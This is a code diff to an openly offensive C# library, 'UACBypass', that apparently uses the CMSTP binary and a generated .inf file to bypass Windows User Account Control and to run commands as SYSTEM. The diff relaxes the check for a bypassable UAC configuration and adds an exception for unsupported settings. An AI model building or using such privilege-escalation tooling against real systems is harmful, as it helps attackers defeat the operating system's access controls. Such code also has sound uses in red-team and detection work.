@@ -27,7 +27,7 @@ namespace UACBypass
 
             if (enableLUA != "1") return false;
 
-            if (consentPromptBehaviorAdmin == "2" || promptOnSecureDesktop == "1") return false;
+            if (consentPromptBehaviorAdmin == "2") return false;
             else return true;
         }
     }
@@ -40,7 +40,7 @@ namespace UACBypass
         /// This method requires that the application is already running as Administrator to complete privileges escalation.
         /// </summary>
         /// <exception cref="AdminPrivilegesException">Thrown if the application is not running as
-        /// Administrator</exception>
+        /// Administrator.</exception>
         public static void startAsNTAuthoritySystem(string CommandToExecute)
         {
             if(!Win32.IsRunAsAdmin())
@@ -138,9 +138,11 @@ namespace UACBypass
         /// <returns>
         /// Returns True if the privilege escalation has been successful.
         /// </returns>
-        /// <exception cref="BinaryNotFoundException">Thrown if the CMSTP binary cannot be found in the System32 directory</exception>
+        /// <exception cref="BinaryNotFoundException">Thrown if the CMSTP binary cannot be found in the System32 directory.</exception>
         /// /// <exception cref="AdminPrivilegesException">Thrown if the application is already running as
-        /// Administrator</exception>
+        /// Administrator.</exception>
+        /// <exception cref="InvalidUACConfigurationException">Thrown if the current configuration of the User Account Control (UAC)
+        /// is not supported by this method.</exception>
         public static bool autoElevate(string CommandToExecute)
         {
             if (!File.Exists(BinaryPath))
@@ -150,6 +152,8 @@ namespace UACBypass
 
             if(Win32.IsRunAsAdmin()) throw new AdminPrivilegesException("The application is already running as Administrator.");
 
+            if (!UAC.canBypassUAC()) throw new InvalidUACConfigurationException("This method doesn't support the current configuration of the User Account Control (UAC).");
+            
             //generate the .inf file.
             StringBuilder InfFile = new StringBuilder();
             InfFile.Append(SetInfFile(CommandToExecute));
